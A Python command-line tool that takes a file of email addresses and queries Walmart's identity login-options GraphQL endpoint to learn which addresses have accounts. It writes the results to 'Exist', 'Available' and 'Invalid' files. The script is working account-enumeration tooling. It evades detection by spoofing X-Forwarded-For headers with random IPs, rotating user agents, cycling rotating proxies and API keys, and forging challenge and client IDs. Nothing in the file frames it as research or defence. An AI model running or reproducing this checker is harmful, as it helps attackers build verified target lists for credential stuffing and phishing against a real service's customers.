import requests
import json
import threading
import uuid
import random
from datetime import datetime
import time
import re
import string
import os
import asyncio
import aiohttp

stop_flag = False

def log_message(message):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] {message}")

# Giữ nguyên các hàm hiện có
def get_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def generate_random_client_id():
    return str(uuid.uuid4())

user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
]

def generate_random_challenge():
    digits = string.digits
    letters = string.ascii_lowercase
    upper = string.ascii_uppercase
    
    challenge = (
        "u" +
        ''.join(random.choice(digits) for _ in range(3)) +
        ''.join(random.choice(letters) for _ in range(3)) +
        ''.join(random.choice(digits) for _ in range(3)) +
        ''.join(random.choice(letters) for _ in range(3)) +
        ''.join(random.choice(upper) for _ in range(2)) +
        ''.join(random.choice(letters) for _ in range(2)) +
        ''.join(random.choice(upper) for _ in range(2)) +
        ''.join(random.choice(letters) for _ in range(6)) +
        random.choice(digits) +
        "_" +
        ''.join(random.choice(letters) for _ in range(7)) +
        random.choice(digits)
    )
    return challenge

def get_initial_data():
    url = "https://identity.walmart.com/account/login"
    client_id = generate_random_client_id()
    initial_headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "X-Forwarded-For": get_random_ip()
    }
    
    try:
        session = requests.Session()
        response = session.get(url, headers=initial_headers, timeout=10)
        cookies = session.cookies.get_dict()
        correlation_id = f"{uuid.uuid4().hex[:5]}-{uuid.uuid4().hex[:15]}"
        trace_id = f"00-{uuid.uuid4().hex[:16]}-{uuid.uuid4().hex[:16]}-00"
        device_profile = f"{uuid.uuid4().hex[:6]}-{uuid.uuid4().hex[:16]}"
        
        challenge = generate_random_challenge()
        referer = f"https://identity.walmart.com/account/login?client_id={client_id}&redirect_uri=https%3A%2F%2Fwww.walmart.com%2Faccount%2FverifyToken&scope=openid+email+offline_access&tenant_id=elh9ie&state=%2F&code_challenge={challenge}"
        
        log_message("Successfully retrieved initial data")
        log_message(f"Generated challenge: {challenge}")
        log_message(f"Generated client_id: {client_id}")
        log_message(f"Cookies retrieved: {cookies}")
        
        return {
            "traceparent": trace_id,
            "wm_qos.correlation_id": correlation_id,
            "x-o-correlation-id": correlation_id,
            "referer": referer,
            "device_profile_ref_id": device_profile,
            "challenge": challenge,
            "client_id": client_id,
            "cookies": cookies
        }
    except Exception as e:
        log_message(f"Error getting initial data: {e}")
        return None

def get_proxy(api_key):
    proxy_url = f"https://wwproxy.com/api/client/proxy/available?key={api_key}&provinceId=-1"
    headers = {
        "User-Agent": random.choice(user_agents),
        "X-Forwarded-For": get_random_ip()
    }
    try:
        response = requests.get(proxy_url, headers=headers, timeout=10)
        proxy_data = response.json()
        
        if proxy_data.get("status") == "OK":
            proxy = proxy_data["data"].get("proxy")
            log_message(f"Got proxy: {proxy} with key: {api_key[:8]}...")
            return proxy
        elif proxy_data.get("status") == "BAD_REQUEST":
            message = proxy_data.get("message", "")
            if "Key đã hết hạn" in message:
                log_message(f"API Key expired: {api_key[:8]}...")
                return "EXPIRED"
            elif "Thời gian giữa hai lần lấy proxy" in message:
                wait_time = int(re.search(r'Vui lòng chờ thêm (\d+)s', message).group(1))
                log_message(f"Proxy rate limit hit for key {api_key[:8]}.... Waiting {wait_time} seconds")
                time.sleep(wait_time)
                return get_proxy(api_key)
            elif "Đã có lỗi xảy ra. Vui lòng thử lại!" in message:
                log_message(f"Proxy error for key {api_key[:8]}.... Retrying in 3 seconds")
                time.sleep(3)
                return get_proxy(api_key)
                
        log_message(f"Unexpected proxy response for key {api_key[:8]}...: {proxy_data}")
        return None
    except Exception as e:
        log_message(f"Error getting proxy with key {api_key[:8]}...: {e}")
        return None

def parse_proxy(proxy_str):
    parts = proxy_str.strip().split(':')
    if len(parts) == 2:
        return {'http': f'http://{parts[0]}:{parts[1]}'}
    elif len(parts) == 4:
        return {'http': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'}
    else:
        log_message(f"Invalid proxy format: {proxy_str}")
        return None

async def check_proxy(session, proxy, timeout=5):
    test_url = "http://www.google.com"
    proxy_url = f"http://{proxy}"
    try:
        async with session.get(test_url, proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=timeout)) as response:
            if response.status == 200:
                return True, proxy
            return False, proxy
    except Exception:
        return False, proxy

async def check_proxies_async(proxies):
    async with aiohttp.ClientSession() as session:
        tasks = [check_proxy(session, proxy) for proxy in proxies]
        results = await asyncio.gather(*tasks)
        return results

def validate_and_filter_proxies(proxies):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    results = loop.run_until_complete(check_proxies_async(proxies))
    live_proxies = [proxy for is_live, proxy in results if is_live]
    dead_proxies = [proxy for is_live, proxy in results if not is_live]
    
    if dead_proxies:
        log_message(f"Removed {len(dead_proxies)} dead proxies: {', '.join(dead_proxies)}")
    if live_proxies:
        log_message(f"Found {len(live_proxies)} live proxies")
    else:
        log_message("No live proxies found!")
    
    return live_proxies

def check_email_status(email, proxy, initial_data):
    if not initial_data:
        log_message("No initial data available")
        return "Invalid"
        
    url = "https://identity.walmart.com/orchestra/idp/graphql"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": random.choice(user_agents),
        "referer": initial_data["referer"],
        "origin": "https://identity.walmart.com",
        "accept": "application/json",
        "accept-language": "en-US",
        "accept-encoding": "gzip, deflate, br, zstd",
        "priority": "u=1, i",
        "traceparent": initial_data["traceparent"],
        "device_profile_ref_id": initial_data["device_profile_ref_id"],
        "downlink": "10",
        "tenant-id": "elh9ie",
        "wm_qos.correlation_id": initial_data["wm_qos.correlation_id"],
        "x-apollo-operation-name": "GetLoginOptions",
        "x-enable-server-timing": "1",
        "x-kl-ajax-request": "Ajax_Request",
        "x-latency-trace": "1",
        "x-o-bu": "WALMART-US",
        "x-o-ccm": "server",
        "x-o-correlation-id": initial_data["x-o-correlation-id"],
        "x-o-gql-query": "query GetLoginOptions",
        "x-o-mart": "B2C",
        "x-o-platform": "rweb",
        "x-o-platform-version": "us-web-1.179.0-b604c2b40cc2c3fd9027cd7a2ef2e2952432aa6f-021019",
        "x-o-segment": "oaoh",
        "X-Forwarded-For": get_random_ip(),
        "Cookie": "; ".join([f"{key}={value}" for key, value in initial_data["cookies"].items()])
    }
    
    if not proxy or proxy == "EXPIRED":
        log_message("No valid proxy available")
        return "Invalid"
    
    proxies = parse_proxy(proxy) if isinstance(proxy, str) else proxy
    if not proxies:
        return "Invalid"
    
    log_message(f"Checking {email} with proxy: {proxy}")

    payload = {
        "query": "query GetLoginOptions($input:UserOptionsInput!){getLoginOptions(input:$input){loginOptions{...LoginOptionsFragment}authCode errors{...LoginOptionsErrorFragment}}}fragment LoginOptionsFragment on LoginOptions{loginId loginIdType emailId phoneNumber{number countryCode isoCountryCode}canUsePassword canUsePhoneOTP canUseEmailOTP loginPhoneLastFour maskedPhoneNumberDetails{loginPhoneLastFour countryCode isoCountryCode}loginMaskedEmailId signInPreference loginPreference lastLoginPreference hasRemainingFactors isPhoneConnected otherAccountsWithPhone loginMaskedEmailId hasPasskeyOnProfile}fragment LoginOptionsErrorFragment on IdentityLoginOptionsError{code message version}",
        "variables": {
            "input": {
                "loginId": email,
                "loginIdType": "EMAIL",
                "ssoOptions": {
                    "wasConsentCaptured": True,
                    "callbackUrl": "https://www.walmart.com/account/verifyToken",
                    "challenge": initial_data["challenge"],
                    "clientId": initial_data["client_id"],
                    "scope": "openid email offline_access",
                    "state": "/"
                }
            }
        }
    }
    try:
        response = requests.post(url, headers=headers, json=payload, proxies=proxies, timeout=10)
        data = response.json()
        
        login_options = data["data"]["getLoginOptions"]
        errors = login_options.get("errors", [])
        
        if errors:
            log_message(f"{email}: Invalid - Errors in response")
            return "Invalid"
        
        login_info = login_options.get("loginOptions", {})
        sign_in_preference = login_info.get("signInPreference")
        can_use_password = login_info.get("canUsePassword", False)
        
        if sign_in_preference == "CREATE" and not can_use_password:
            log_message(f"{email}: Available")
            return "Available"
        log_message(f"{email}: Exist")
        return "Exist"
    except Exception as e:
        log_message(f"Error checking {email}: {str(e)}")
        return "Error"
    finally:
        delay = random.uniform(3, 5)
        log_message(f"Waiting {delay:.2f} seconds before next request...")
        time.sleep(delay)

def check_email_status_no_proxy(email, initial_data):
    if not initial_data:
        log_message("No initial data available")
        return "Invalid"
        
    url = "https://identity.walmart.com/orchestra/idp/graphql"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": random.choice(user_agents),
        "referer": initial_data["referer"],
        "origin": "https://identity.walmart.com",
        "accept": "application/json",
        "accept-language": "en-US",
        "accept-encoding": "gzip, deflate, br, zstd",
        "priority": "u=1, i",
        "traceparent": initial_data["traceparent"],
        "device_profile_ref_id": initial_data["device_profile_ref_id"],
        "downlink": "10",
        "tenant-id": "elh9ie",
        "wm_qos.correlation_id": initial_data["wm_qos.correlation_id"],
        "x-apollo-operation-name": "GetLoginOptions",
        "x-enable-server-timing": "1",
        "x-kl-ajax-request": "Ajax_Request",
        "x-latency-trace": "1",
        "x-o-bu": "WALMART-US",
        "x-o-ccm": "server",
        "x-o-correlation-id": initial_data["x-o-correlation-id"],
        "x-o-gql-query": "query GetLoginOptions",
        "x-o-mart": "B2C",
        "x-o-platform": "rweb",
        "x-o-platform-version": "us-web-1.179.0-b604c2b40cc2c3fd9027cd7a2ef2e2952432aa6f-021019",
        "x-o-segment": "oaoh",
        "X-Forwarded-For": get_random_ip(),
        "Cookie": "; ".join([f"{key}={value}" for key, value in initial_data["cookies"].items()])
    }
    
    log_message(f"Checking {email} without proxy")

    payload = {
        "query": "query GetLoginOptions($input:UserOptionsInput!){getLoginOptions(input:$input){loginOptions{...LoginOptionsFragment}authCode errors{...LoginOptionsErrorFragment}}}fragment LoginOptionsFragment on LoginOptions{loginId loginIdType emailId phoneNumber{number countryCode isoCountryCode}canUsePassword canUsePhoneOTP canUseEmailOTP loginPhoneLastFour maskedPhoneNumberDetails{loginPhoneLastFour countryCode isoCountryCode}loginMaskedEmailId signInPreference loginPreference lastLoginPreference hasRemainingFactors isPhoneConnected otherAccountsWithPhone loginMaskedEmailId hasPasskeyOnProfile}fragment LoginOptionsErrorFragment on IdentityLoginOptionsError{code message version}",
        "variables": {
            "input": {
                "loginId": email,
                "loginIdType": "EMAIL",
                "ssoOptions": {
                    "wasConsentCaptured": True,
                    "callbackUrl": "https://www.walmart.com/account/verifyToken",
                    "challenge": initial_data["challenge"],
                    "clientId": initial_data["client_id"],
                    "scope": "openid email offline_access",
                    "state": "/"
                }
            }
        }
    }
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        data = response.json()
        
        login_options = data["data"]["getLoginOptions"]
        errors = login_options.get("errors", [])
        
        if errors:
            log_message(f"{email}: Invalid - Errors in response")
            return "Invalid"
        
        login_info = login_options.get("loginOptions", {})
        sign_in_preference = login_info.get("signInPreference")
        can_use_password = login_info.get("canUsePassword", False)
        
        if sign_in_preference == "CREATE" and not can_use_password:
            log_message(f"{email}: Available")
            return "Available"
        log_message(f"{email}: Exist")
        return "Exist"
    except Exception as e:
        log_message(f"Error checking {email}: {str(e)}")
        return "Error"
    finally:
        delay = random.uniform(3, 5)
        log_message(f"Waiting {delay:.2f} seconds before next request...")
        time.sleep(delay)

def get_working_proxy(api_keys, key_index):
    while True:
        current_key = api_keys[key_index % len(api_keys)]
        proxy = get_proxy(current_key)
        
        if proxy == "EXPIRED":
            key_index += 1
            log_message(f"Skipping expired key, moving to next: {api_keys[key_index % len(api_keys)][:8]}...")
            continue
        if proxy:
            return proxy, key_index, current_key
        key_index += 1
        if key_index >= len(api_keys):
            return None, key_index, None

def remove_email_from_file(file_path, email):
    try:
        with open(file_path, "r") as file:
            lines = [line.strip() for line in file if line.strip() != email]
        with open(file_path, "w") as file:
            for line in lines:
                file.write(line + "\n")
        log_message(f"Removed {email} from {file_path}")
    except Exception as e:
        log_message(f"Error removing {email} from {file_path}: {e}")

def process_emails(file_path, proxy_mode, api_keys=None, proxies=None):
    global stop_flag
    stop_flag = False

    use_wwproxy = proxy_mode == "wwproxy"
    use_custom_proxy = proxy_mode == "custom"
    use_no_proxy = proxy_mode == "no_proxy"
    
    if use_wwproxy:
        if not api_keys:
            log_message("Please provide at least one valid API key!")
            return
        log_message(f"Loaded {len(api_keys)} API keys")
    elif use_custom_proxy:
        if not proxies:
            log_message("Please provide at least one proxy!")
            return
        log_message(f"Validating {len(proxies)} proxies...")
        live_proxies = validate_and_filter_proxies(proxies)
        if not live_proxies:
            log_message("No live proxies available after validation!")
            return
        log_message(f"Using {len(live_proxies)} live proxies")
    
    if not os.path.exists(file_path):
        log_message(f"Email file {file_path} not found!")
        return
    
    with open(file_path, "r") as file:
        emails = [line.strip() for line in file if line.strip()]
    log_message(f"Loaded {len(emails)} emails from file")
    
    initial_data = get_initial_data()
    if not initial_data:
        log_message("Failed to get initial data!")
        return
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    exist_file = f"WM-Exist_{timestamp}.txt"
    available_file = f"WM-Available_{timestamp}.txt"
    invalid_file = f"WM-Invalid_{timestamp}.txt"
    log_message(f"Result files: {exist_file}, {available_file}, {invalid_file}")
    
    if use_wwproxy:
        key_index = 0
        proxy, key_index, current_key = get_working_proxy(api_keys, key_index)
        if not proxy:
            log_message("No working API keys found!")
            return
    elif use_custom_proxy:
        proxy_index = 0
        proxy = live_proxies[proxy_index % len(live_proxies)]
    else:
        proxy = None
    
    for email in emails[:]:
        if stop_flag:
            log_message("Process stopped by user")
            break
        
        if use_no_proxy:
            status = check_email_status_no_proxy(email, initial_data)
            log_message(f"Checking: {email} - {status} (No Proxy)")
        else:
            status = check_email_status(email, proxy, initial_data)
            log_message(f"Checking: {email} - {status} (Proxy: {proxy})")
        
        while status == "Error" and not stop_flag:
            if use_wwproxy:
                key_index += 1
                proxy, key_index, current_key = get_working_proxy(api_keys, key_index)
                if not proxy:
                    log_message("All API keys failed or expired!")
                    return
            elif use_custom_proxy:
                proxy_index += 1
                if proxy_index >= len(live_proxies):
                    log_message("All proxies failed, revalidating...")
                    live_proxies = validate_and_filter_proxies(live_proxies)
                    if not live_proxies:
                        log_message("All proxies died during process!")
                        return
                    proxy_index = 0
                proxy = live_proxies[proxy_index % len(live_proxies)]
            else:
                proxy = None
            
            initial_data = get_initial_data()
            if not initial_data:
                log_message("Failed to get new initial data!")
                return
                
            if use_no_proxy:
                status = check_email_status_no_proxy(email, initial_data)
                log_message(f"Checking: {email} - {status} (No Proxy)")
            else:
                status = check_email_status(email, proxy, initial_data)
                log_message(f"Checking: {email} - {status} (Proxy: {proxy})")
        
        if status == "Exist":
            with open(exist_file, "a") as f:
                f.write(email + "\n")
        elif status == "Available":
            with open(available_file, "a") as f:
                f.write(email + "\n")
        else:
            with open(invalid_file, "a") as f:
                f.write(email + "\n")
        
        remove_email_from_file(file_path, email)
    
    if not stop_flag:
        log_message("Process completed")

def main():
    print("Email Checker - Choose Proxy Mode:")
    print("1. WWProxy API Keys")
    print("2. Custom Proxies")
    print("3. No Proxy")
    choice = input("Enter your choice (1-3): ").strip()
    
    file_path = input("Enter the path to your email list file (e.g., emails.txt): ").strip()
    
    if choice == "1":
        proxy_mode = "wwproxy"
        api_keys_input = input("Enter WWProxy API Keys (one per line, press Enter twice to finish):\n")
        api_keys = [key.strip() for key in api_keys_input.split('\n') if key.strip()]
        process_emails(file_path, proxy_mode, api_keys=api_keys)
    elif choice == "2":
        proxy_mode = "custom"
        proxies_input = input("Enter Proxies (IP:PORT or IP:PORT:USER:PASS, one per line, press Enter twice to finish):\n")
        proxies = [proxy.strip() for proxy in proxies_input.split('\n') if proxy.strip()]
        process_emails(file_path, proxy_mode, proxies=proxies)
    elif choice == "3":
        proxy_mode = "no_proxy"
        process_emails(file_path, proxy_mode)
    else:
        print("Invalid choice!")

if __name__ == "__main__":
    main()